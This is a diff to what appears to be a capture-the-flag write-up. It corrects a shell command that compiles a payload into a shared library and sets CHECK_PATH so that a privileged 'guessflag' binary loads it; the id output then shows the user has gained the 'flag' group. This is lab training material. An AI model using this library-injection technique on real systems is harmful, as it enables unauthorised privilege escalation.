@@ -115,7 +115,7 @@ void begin (void) {
 
 ```
 user1@insomniak:/tmp/pld$ gcc -o dowin.so -fPIC -shared payload.c
-user1@insomniak:/tmp/pld$ export CHECK_PATH=/tmp/pld ./guessflag a
+user1@insomniak:/tmp/pld$ CHECK_PATH=/tmp/pld ./guessflag a
 Can you guess the flag ?
 user1@insomniak:/tmp/pld$ id
 uid=1005(user1) gid=985(users) groups=985(users), 990(flag)
